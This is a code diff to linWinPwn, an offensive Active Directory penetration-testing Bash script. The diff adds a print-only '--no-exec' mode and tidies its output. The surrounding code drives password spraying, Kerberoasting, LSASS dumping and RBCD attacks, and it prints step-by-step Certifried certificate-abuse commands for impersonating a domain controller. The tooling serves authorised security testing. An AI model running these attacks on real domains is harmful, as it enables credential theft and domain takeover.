@@ -38,6 +38,7 @@ forcekerb_bool=false
 verbose_bool=false
 dnstcp_bool=false
 useip_bool=false
+noexec_bool=false
 
 #Tools variables
 scripts_dir="/opt/lwp-scripts"
@@ -150,7 +151,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.3.1 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.3.2 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -181,6 +182,7 @@ help_linWinPwn() {
     echo -e "--dns-ip            Use Custom IP for DNS (instead of the DomainController)"
     echo -e "--dns-tcp           Use TCP protocol for DNS (when possible)"
     echo -e "--use-ip            Use IP addresses instead of hostnames (if DNS issues)"
+    echo -e "--no-exec           Only prints commands to be executed, does not run any tools"
     echo -e "--verbose           Enable all verbose and debug outputs"
     echo -e "-I/--interface      Attacker's network interface (default: eth0)"
     echo -e "-T/--targets        Target systems for Vuln Scan, SMB Scan, Network Scan and Pwd Dump (Interactive mode default = DC, Auto mode default = All)"
@@ -306,6 +308,10 @@ while test $# -gt 0; do
         useip_bool=true
         args+=("$1")
         ;;
+    --no-exec)
+        noexec_bool=true
+        args+=("$1")
+        ;;
     --verbose)
         verbose_bool=true
         args+=("$1")
@@ -326,17 +332,21 @@ done
 set -- "${args[@]}"
 
 run_command() {
-    pattern="${password}${hash}${aeskey}"
-    if [ -n "$pattern" ]; then
-        escaped=$(printf '%s' "$pattern" | sed 's/[][\\/.*^$]/\\&/g')
-        sed_expr="s/${escaped}/********/g"
-        echo "$(date '+%F %T'); $*" | sed -e "$sed_expr" 2>/dev/null >> "$command_log"
-        echo -e "${YELLOW}[i]${NC} Running command: $*\n" | sed -e "$sed_expr" 2>/dev/null > /dev/tty
+    if [ "${noexec_bool}" == false ]; then
+        pattern="${password}${hash}${aeskey}"
+        if [ -n "$pattern" ]; then
+            escaped=$(printf '%s' "$pattern" | sed 's/[][\\/.*^$]/\\&/g')
+            sed_expr="s/${escaped}/********/g"
+            echo "$(date '+%F %T'); $*" | sed -e "$sed_expr" 2>/dev/null >> "$command_log"
+            echo -e "${YELLOW}[i]${NC} Running command: $*" | sed -e "$sed_expr" 2>/dev/null > /dev/tty
+        else
+            echo "$(date '+%F %T'); $*" >> "$command_log"
+            echo -e "${YELLOW}[i]${NC} Running command: $*" > /dev/tty
+        fi
+        /usr/bin/script -qc "$@" /dev/null
     else
-        echo "$(date '+%F %T'); $*" >> "$command_log"
-        echo -e "${YELLOW}[i]${NC} Running command: $*\n" > /dev/tty
+        echo -e "${YELLOW}[i]${NC} Printing command: $*" > /dev/tty
     fi
-    /usr/bin/script -qc "$@" /dev/null
 }
 
 ntp_update() {
@@ -953,6 +963,7 @@ authenticate() {
     fi
 
     echo -e "${auth_string}"
+    echo -e ""
 }
 
 parse_servers() {
@@ -980,7 +991,7 @@ dns_enum() {
     else
         echo -e "${BLUE}[*] DNS dump using adidnsdump${NC}"
         dns_records="${Servers_dir}/dns_records_${dc_domain}.csv"
-        if ! stat "${dns_records}" >/dev/null 2>&1; then
+        if ! stat "${dns_records}" >/dev/null 2>&1 || [ "${noexec_bool}" == "true" ]; then
             if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
                 echo -e "${PURPLE}[-] adidnsdump does not support Kerberos authentication${NC}"
             else
@@ -1025,7 +1036,7 @@ ne_scan() {
         servers_scan_out="${Scans_dir}/ne_${1}_custom_output_${dc_domain}.txt"
         /bin/rm "${servers_scan_out}" 2>/dev/null
     fi
-    if stat "${servers_list}" >/dev/null 2>&1; then
+    if stat "${servers_list}" >/dev/null 2>&1 && [ "${noexec_bool}" == "false" ]; then
         echo -e "${YELLOW}[i] ${1^^} port scan results found, would you like to run the port scan again? (y/N)${NC}"
         ans="N"
         read -rp ">> " ans </dev/tty
@@ -1076,7 +1087,7 @@ bhd_enum() {
     else
         mkdir -p "${DomainRecon_dir}/BloodHound_${user_var}"
         echo -e "${BLUE}[*] BloodHound Enumeration using all collection methods (Noisy!)${NC}"
-        if [ -n "$(find "${DomainRecon_dir}/BloodHound_${user_var}/" -type f -name '*.json' -print -quit)" ]; then
+        if [ -n "$(find "${DomainRecon_dir}/BloodHound_${user_var}/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
             echo -e "${YELLOW}[i] BloodHound results found, would you like to run the scan again? (y/N)${NC}"
             bdh_ans="N"
             read -rp ">> " bdh_ans </dev/tty
@@ -1111,7 +1122,7 @@ bhd_enum_dconly() {
     else
         mkdir -p "${DomainRecon_dir}/BloodHound_${user_var}"
         echo -e "${BLUE}[*] BloodHound Enumeration using DCOnly${NC}"
-        if [ -n "$(find "${DomainRecon_dir}/BloodHound_${user_var}/" -type f -name '*.json' -print -quit)" ]; then
+        if [ -n "$(find "${DomainRecon_dir}/BloodHound_${user_var}/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
             echo -e "${YELLOW}[i] BloodHound results found, would you like to run the scan again? (y/N)${NC}"
             bdh_ans="N"
             read -rp ">> " bdh_ans </dev/tty
@@ -1146,7 +1157,7 @@ bhdce_enum() {
     else
         mkdir -p "${DomainRecon_dir}/BloodHoundCE_${user_var}"
         echo -e "${BLUE}[*] BloodHoundCE Enumeration using all collection methods (Noisy!)${NC}"
-        if [ -n "$(find "${DomainRecon_dir}/BloodHoundCE_${user_var}/" -type f -name '*.json' -print -quit)" ]; then
+        if [ -n "$(find "${DomainRecon_dir}/BloodHoundCE_${user_var}/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
             echo -e "${YELLOW}[i] BloodHoundCE results found, would you like to run the scan again? (y/N)${NC}"
             bdh_ans="N"
             read -rp ">> " bdh_ans </dev/tty
@@ -1178,7 +1189,7 @@ bhdce_enum_dconly() {
     else
         mkdir -p "${DomainRecon_dir}/BloodHoundCE_${user_var}"
         echo -e "${BLUE}[*] BloodHoundCE Enumeration using DCOnly${NC}"
-        if [ -n "$(find "${DomainRecon_dir}/BloodHoundCE_${user_var}/" -type f -name '*.json' -print -quit)" ]; then
+        if [ -n "$(find "${DomainRecon_dir}/BloodHoundCE_${user_var}/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
             echo -e "${YELLOW}[i] BloodHoundCE results found, would you like to run the scan again? (y/N)${NC}"
             bdh_ans="N"
             read -rp ">> " bdh_ans </dev/tty
@@ -1210,7 +1221,7 @@ ldapdomaindump_enum() {
     else
         mkdir -p "${DomainRecon_dir}/LDAPDomainDump"
         echo -e "${BLUE}[*] ldapdomaindump Enumeration${NC}"
-        if [ -n "$(find "${DomainRecon_dir}/LDAPDomainDump/" -type f -name '*.json' -print -quit)" ]; then
+        if [ -n "$(find "${DomainRecon_dir}/LDAPDomainDump/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
             echo -e "${YELLOW}[i] ldapdomaindump results found, would you like to run the scan again? (y/N)${NC}"
             ldd_ans="N"
             read -rp ">> " ldd_ans </dev/tty
@@ -1313,18 +1324,18 @@ ne_ldap_enum() {
     fi
     parse_servers
     echo -e ""
-    echo -e ""
     echo -e "${BLUE}[*] Password not required Enumeration${NC}"
     run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --password-not-required --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_passnotrequired_output_${dc_domain}.txt" 2>&1
     echo -e ""
     echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
     run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M get-desc-users --kdcHost ${dc_FQDN}" >"${DomainRecon_dir}/ne_get-desc-users_pass_output_${dc_domain}.txt"
+    echo -e ""
     echo -e "${BLUE}[*] Attributes userPassword or unixUserPassword of users ${NC}"
     run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M get-unixUserPassword -M get-userPassword --kdcHost ${dc_FQDN}" >"${DomainRecon_dir}/ne_get-userpass_output_${dc_domain}.txt"
     if [ -s "${DomainRecon_dir}/ne_get-desc-users_pass_output_${dc_domain}.txt" ]; then
         grep -i "pass\|pwd\|passwd\|password\|pswd\|pword" "${DomainRecon_dir}/ne_get-desc-users_pass_output_${dc_domain}.txt" | tee "${DomainRecon_dir}/ne_get-desc-users_pass_results_${dc_domain}.txt" 2>&1
     fi
-    if [ ! -s "${DomainRecon_dir}/ne_get-desc-users_pass_results_${dc_domain}.txt" ]; then
+    if [ ! -s "${DomainRecon_dir}/ne_get-desc-users_pass_results_${dc_domain}.txt" ] && [ "${noexec_bool}" == "false" ]; then
         echo -e "${PURPLE}[-] No users with passwords in description found${NC}"
     fi
     echo -e ""
@@ -1349,6 +1360,7 @@ deleg_enum() {
             echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
         fi
     fi
+    echo -e ""
     echo -e "${BLUE}[*] findDelegation check (netexec)${NC}"
     run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --find-delegation --kdcHost ${dc_FQDN} --log ${DomainRecon_dir}/ne_find-delegation_output_${dc_domain}.txt" 2>&1
     echo -e ""
@@ -1466,7 +1478,7 @@ silenthound_enum() {
     else
         mkdir -p "${DomainRecon_dir}/SilentHound"
         echo -e "${BLUE}[*] SilentHound Enumeration${NC}"
-        if [ -n "$(find "${DomainRecon_dir}/SilentHound/" -maxdepth 1 -type f ! -name 'silenthound_output' -print -quit)" ]; then
+        if [ -n "$(find "${DomainRecon_dir}/SilentHound/" -maxdepth 1 -type f ! -name 'silenthound_output' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
             echo -e "${YELLOW}[i] SilentHound results found, would you like to run the scan again? (y/N)${NC}"
             shd_ans="N"
             read -rp ">> " shd_ans </dev/tty
@@ -1493,7 +1505,6 @@ silenthound_enum() {
                 head -n 20 "${DomainRecon_dir}/SilentHound/silenthound_output_${dc_domain}.txt"
                 echo -e "............................(truncated output)"
             fi
-            echo -e "${GREEN}[+] SilentHound enumeration complete.${NC}"
         fi
         parse_users
         parse_servers
@@ -1507,7 +1518,7 @@ ldeep_enum() {
     else
         mkdir -p "${DomainRecon_dir}/ldeepDump"
         echo -e "${BLUE}[*] ldeep Enumeration${NC}"
-        if [ -n "$(find "${DomainRecon_dir}/ldeepDump/" -type f -name '*.json' -print -quit)" ]; then
+        if [ -n "$(find "${DomainRecon_dir}/ldeepDump/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
             echo -e "${YELLOW}[i] ldeep results found, would you like to run the scan again? (y/N)${NC}"
             ldeep_ans="N"
             read -rp ">> " ldeep_ans </dev/tty
@@ -1559,7 +1570,6 @@ windapsearch_enum() {
                 echo -e "${GREEN}[+] Printing passwords found in LDAP fields...${NC}"
                 /bin/cat "${DomainRecon_dir}/windapsearch/windapsearch_pwdfields_${dc_domain}.txt"
             fi
-            echo -e "${GREEN}[+] windapsearch enumeration of users, servers, groups complete.${NC}"
             parse_users
             parse_servers
         fi
@@ -1650,7 +1660,7 @@ adalanche_enum() {
     else
         mkdir -p "${DomainRecon_dir}/Adalanche"
         echo -e "${BLUE}[*] Adalanche Enumeration${NC}"
-        if [ -n "$(ls -A "${DomainRecon_dir}/Adalanche/data")" ]; then
+        if [ -n "$(ls -A "${DomainRecon_dir}/Adalanche/data" 2>/dev/null )" ] && [ "${noexec_bool}" == "false" ]; then
             echo -e "${YELLOW}[i] Adalanche results found, would you like to run the scan again? (y/N)${NC}"
             ada_ans="N"
             read -rp ">> " ada_ans </dev/tty
@@ -1818,7 +1828,7 @@ soaphd_enum() {
     else
         mkdir -p "${DomainRecon_dir}/Soaphound_${user_var}"
         echo -e "${BLUE}[*] Soaphound Enumeration using all collection methods (Noisy!)${NC}"
-        if [ -n "$(find "${DomainRecon_dir}/Soaphound_${user_var}/" -type f -name '*.json' -print -quit)" ]; then
+        if [ -n "$(find "${DomainRecon_dir}/Soaphound_${user_var}/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
             echo -e "${YELLOW}[i] Soaphound results found, would you like to run the scan again? (y/N)${NC}"
             sph_ans="N"
             read -rp ">> " sph_ans </dev/tty
@@ -1841,7 +1851,7 @@ soaphd_enum_dconly() {
     else
         mkdir -p "${DomainRecon_dir}/Soaphound_${user_var}"
         echo -e "${BLUE}[*] Soaphound Enumeration using DCOnly${NC}"
-        if [ -n "$(find "${DomainRecon_dir}/Soaphound_${user_var}/" -type f -name '*.json' -print -quit)" ]; then
+        if [ -n "$(find "${DomainRecon_dir}/Soaphound_${user_var}/" -type f -name '*.json' -print -quit)" ] && [ "${noexec_bool}" == "false" ]; then
             echo -e "${YELLOW}[i] Soaphound results found, would you like to run the scan again? (y/N)${NC}"
             sph_ans="N"
             read -rp ">> " sph_ans </dev/tty
@@ -1861,14 +1871,15 @@ soaphd_enum_dconly() {
 ###### adcs_enum: ADCS Enumeration
 ne_adcs_enum() {
     mkdir -p "${ADCS_dir}"
-    if ! stat "${ADCS_dir}/ne_adcs_output_${user_var}.txt" >/dev/null 2>&1; then
+    if ! stat "${ADCS_dir}/ne_adcs_output_${user_var}.txt" >/dev/null 2>&1 || [ "${noexec_bool}" == "true" ]; then
         echo -e "${BLUE}[*] ADCS Enumeration${NC}"
         run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M adcs --kdcHost ${dc_FQDN} --log ${ADCS_dir}/ne_adcs_output_${user_var}.txt" 2>&1
     else
         echo -e "${YELLOW}[i] ADCS info found, skipping...${NC}"
     fi
-    pki_servers=$(grep -o "Found PKI Enrollment Server.*" "${ADCS_dir}/ne_adcs_output_${user_var}.txt" | cut -d " " -f 5- | awk '!x[$0]++')
-    pki_cas=$(grep -o "Found CN.*" "${ADCS_dir}/ne_adcs_output_${user_var}.txt" | cut -d " " -f 3- | sed "s/ /SPACE/g" | awk '!x[$0]++')
+    pki_servers=$(grep -o "Found PKI Enrollment Server.*" "${ADCS_dir}/ne_adcs_output_${user_var}.txt" 2>/dev/null | cut -d " " -f 5- | awk '!x[$0]++')
+    pki_cas=$(grep -o "Found CN.*" "${ADCS_dir}/ne_adcs_output_${user_var}.txt" 2>/dev/null | cut -d " " -f 3- | sed "s/ /SPACE/g" | awk '!x[$0]++')
+    echo -e ""
 }
 
 certi_py_enum() {
@@ -1892,7 +1903,7 @@ certipy_enum() {
         echo -e "${RED}[-] Please verify the installation of certipy${NC}"
     else
         echo -e "${BLUE}[*] Certipy Enumeration${NC}"
-        if stat "${ADCS_dir}/vuln_${domain}_Certipy.json" >/dev/null 2>&1; then
+        if stat "${ADCS_dir}/vuln_${domain}_Certipy.json" >/dev/null 2>&1 && [ "${noexec_bool}" == "false" ]; then
             echo -e "${YELLOW}[i] Certipy results found, would you like to run the scan again? (y/N)${NC}"
             cert_ans="N"
             read -rp ">> " cert_ans </dev/tty
@@ -1918,8 +1929,8 @@ certipy_enum() {
             cd "${current_dir}" || exit
         fi
     fi
-    adcs_vuln_parse | tee "${ADCS_dir}/ADCS_exploitation_steps_${dc_domain}.txt"
     echo -e ""
+    adcs_vuln_parse | tee "${ADCS_dir}/ADCS_exploitation_steps_${dc_domain}.txt"
 }
 
 adcs_vuln_parse() {
@@ -2105,39 +2116,43 @@ certifried_check() {
     if ! stat "${certipy}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of certipy${NC}"
     else
-        echo -e "${BLUE}[*] Certifried Vulnerability Check${NC}"
         if [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] certipy requires credentials${NC}"
         else
             ne_adcs_enum
-            current_dir=$(pwd)
-            cd "${Credentials_dir}" || exit
-            i=0
-            for pki_server in $pki_servers; do
-                i=$((i + 1))
-                pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
-                if [ "${ldaps_bool}" == true ]; then
-                    ldaps_param=""
-                    if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-channel-binding"; fi
-                else
-                    ldaps_param="-ldap-scheme ldap"
-                    if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
-                fi
-                if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-                run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096" 2>&1 | tee "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"
-                if ! grep -q "Certificate object SID is" "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt" && ! grep -q "error" "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"; then
-                    echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca \"${pki_ca//SPACE/ }\" -template Machine -key-size 4096 ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${CYAN}3. Authenticate using pfx:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip} ${ldaps_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${CYAN}4. Delete the created computer:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                    echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
-                fi
-            done
-            cd "${current_dir}" || exit
+            echo -e "${BLUE}[*] Certifried Vulnerability Check${NC}"
+            if [ ! "${pki_servers}" == "" ] && [ ! "${pki_cas}" == "" ]; then
+                current_dir=$(pwd)
+                cd "${Credentials_dir}" || exit
+                i=0
+                for pki_server in $pki_servers; do
+                    i=$((i + 1))
+                    pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
+                    if [ "${ldaps_bool}" == true ]; then
+                        ldaps_param=""
+                        if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-channel-binding"; fi
+                    else
+                        ldaps_param="-ldap-scheme ldap"
+                        if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
+                    fi
+                    if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
+                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096" 2>&1 | tee "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"
+                    if ! grep -q "Certificate object SID is" "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt" && ! grep -q "error" "${ADCS_dir}/certifried_check_${pki_server}_${user_var}.txt"; then
+                        echo -e "${GREEN}[+] ${pki_server} potentially vulnerable to Certifried! Follow steps below for exploitation:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${CYAN}1. Create a new computer account with a dNSHostName property of a Domain Controller:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${certipy} account create ${argument_certipy} -user NEW_COMPUTER_NAME -pass NEW_COMPUTER_PASS -dc-ip $dc_ip -dns $dc_NETBIOS.$dc_domain ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${CYAN}2. Obtain a certificate for the new computer:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${certipy} req -u NEW_COMPUTER_NAME\$@${dc_domain} -p NEW_COMPUTER_PASS -dc-ip $dc_ip -target $pki_server -ca \"${pki_ca//SPACE/ }\" -template Machine -key-size 4096 ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${CYAN}3. Authenticate using pfx:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -username ${dc_NETBIOS}\$ -dc-ip ${dc_ip} ${ldaps_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${CYAN}4. Delete the created computer:${NC}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                        echo -e "${certipy} account delete ${argument_certipy} -dc-ip ${dc_ip} -user NEW_COMPUTER_NAME ${ldaps_param} ${ldapbindsign_param}" | tee -a "${ADCS_dir}/Certifried_exploitation_steps_${dc_domain}.txt"
+                    fi
+                done
+                cd "${current_dir}" || exit
+            else
+                echo -e "${PURPLE}[-] No ADCS servers found! Please re-run ADCS enumeration and try again..${NC}"
+            fi
         fi
     fi
     echo -e ""
@@ -2198,11 +2213,11 @@ certipy_ca_dump() {
 }
 
 masky_dump() {
-    echo -e "${BLUE}[*] Dumping LSASS using masky (ADCS required)${NC}"
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
         ne_adcs_enum
+        echo -e "${BLUE}[*] Dumping LSASS using masky (ADCS required)${NC}"
         if [ ! "${pki_servers}" == "" ] && [ ! "${pki_cas}" == "" ]; then
             i=0
             for pki_server in $pki_servers; do
@@ -2276,7 +2291,6 @@ sccmhunter_dump() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
             if ! grep -q 'SCCM doesn' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt" && ! grep -q 'Traceback' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"; then
-                echo -e "${GREEN}[+] SCCM server found!${NC}"
                 run_command "${python3} ${sccmhunter} http ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -auto" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_dump_output_${dc_domain}.txt"
             else
                 echo -e "${PURPLE}[-] No SCCM servers found! Please re-run SCCM enumeration using sccmhunter and try again..${NC}"
@@ -2438,7 +2452,7 @@ userpass_ne_check() {
     if [ -s "${BruteForce_dir}/user_eq_pass_valid_ne_${dc_domain}.txt" ]; then
         echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
         /bin/cat "${BruteForce_dir}/user_eq_pass_valid_ne_${dc_domain}.txt" | sort -uf
-    else
+    elif [ "${noexec_bool}" == "false" ]; then
         echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
     fi
     echo -e ""
@@ -2471,7 +2485,7 @@ userpass_kerbrute_check() {
         if [ -s "${BruteForce_dir}/user_eq_pass_valid_kerb_${dc_domain}.txt" ]; then
             echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
             /bin/cat "${BruteForce_dir}/user_eq_pass_valid_kerb_${dc_domain}.txt" | sort -uf
-        else
+        elif [ "${noexec_bool}" == "false" ]; then
             echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
         fi
     fi
@@ -2501,7 +2515,7 @@ ne_passpray() {
     if [ -s "${BruteForce_dir}/passpray_valid_ne_${dc_domain}.txt" ]; then
         echo -e "${GREEN}[+] Printing accounts with passwords found...${NC}"
         /bin/cat "${BruteForce_dir}/passpray_valid_ne_${dc_domain}.txt" | sort -uf
-    else
+    elif [ "${noexec_bool}" == "false" ]; then
         echo -e "${PURPLE}[-] No accounts with password ${passpray_password} found${NC}"
     fi
     echo -e ""
@@ -2533,7 +2547,7 @@ kerbrute_passpray() {
         if [ -s "${BruteForce_dir}/passpray_valid_kerb_${dc_domain}.txt" ]; then
             echo -e "${GREEN}[+] Printing accounts with passwords found ...${NC}"
             /bin/cat "${BruteForce_dir}/passpray_valid_kerb_${dc_domain}.txt" | sort -uf
-        else
+        elif [ "${noexec_bool}" == "false" ]; then
             echo -e "${PURPLE}[-] No accounts with password ${passpray_password} found${NC}"
         fi
     fi
@@ -2641,7 +2655,7 @@ asrep_attack() {
                 else
                     echo -e "${PURPLE}[-] Failed to extract hashes!${NC}"
                 fi
-            else
+            elif [ "${noexec_bool}" == "false" ]; then
                 echo -e "${PURPLE}[-] No ASREP-Roastable accounts found${NC}"
             fi
         fi
@@ -2699,7 +2713,7 @@ kerberoast_attack() {
                 run_command "${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${users_list} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${dc_domain}" >"${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt"
                 if grep -q 'error' "${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt"; then
                     echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
-                else
+                elif [ "${noexec_bool}" == "false" ];then
                     grep "krb5tgs" "${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt" | tee "${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt"
                     hash_count=$(wc -l < "${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt")
                     if [[ ! "${hash_count}" == 0 ]]; then
@@ -2718,7 +2732,7 @@ kerberoast_attack() {
             #${netexec} ${ne_verbose} smb ${curr_targets_list} "${argument_ne}" --kerberoasting --log ${Kerberos_dir}/kerberoast_output_${dc_domain}.txt" 2>&1
             if grep -q 'error' "${Kerberos_dir}/kerberoast_output_${dc_domain}.txt"; then
                 echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
-            else
+            elif [ "${noexec_bool}" == "false" ];then
                 grep "krb5tgs" "${Kerberos_dir}/kerberoast_output_${dc_domain}.txt" >"${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt"
                 hash_count=$(wc -l < "${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt")
                 if [[ ! "${hash_count}" == 0 ]]; then
@@ -3102,7 +3116,7 @@ webdav_check() {
 smbsigning_check() {
     echo -e "${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}"
     run_command "${netexec} ${ne_verbose} smb ${curr_targets_list} ${argument_ne} --gen-relay-list ${Vulnerabilities_dir}/ne_smbsigning_output_${dc_domain}.txt" 2>&1
-    if [ ! -s "${Vulnerabilities_dir}/ne_smbsigning_output_${dc_domain}.txt" ]; then
+    if [ ! -s "${Vulnerabilities_dir}/ne_smbsigning_output_${dc_domain}.txt" ] && [ "${noexec_bool}" == "false" ]; then
         echo -e "${PURPLE}[-] No servers with SMB signing disabled found ${NC}"
     fi
     echo -e ""
@@ -3654,8 +3668,8 @@ targetedkerberoast_attack() {
                 else
                     echo -e "${PURPLE}[-] Failed to extract hashes!${NC}"
                 fi
-            else
-                echo -e "${YELLOW}[-] No hashes found.${NC}"
+            elif [ "${noexec_bool}" == "false" ];then
+                echo -e "${PURPLE}[-] No hashes found!${NC}"
             fi
         fi
     fi
@@ -3765,7 +3779,7 @@ rbcd_spnless_attack() {
                         echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
                         echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${user_spnless}'"
                     fi
-                else
+                elif [ "${noexec_bool}" == "false" ];then
                     echo -e "${RED}[-] Failed to generate TGT${NC}"
                 fi
                 cd "${current_dir}" || exit
@@ -4354,6 +4368,8 @@ winrm_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSA SAM dump requires credentials${NC}"
     else
+        echo -e "${BLUE}[*] Please specify IP or hostname of WinRM server:${NC}"
+        echo -e "${CYAN}[*] Example: 10.1.0.5 or DC01 or DC01.domain.com ${NC}"
         target_winrm=""
         read -rp ">> " target_winrm </dev/tty
         while [ "${target_winrm}" == "" ]; do
@@ -5199,6 +5215,7 @@ gpo_menu() {
 
 bruteforce_menu() {
     mkdir -p "${BruteForce_dir}"
+    echo -e ""
     echo -e "${CYAN}[BruteForce menu]${NC} Please choose from the following options:"
     echo -e "----------------------------------------------------------"
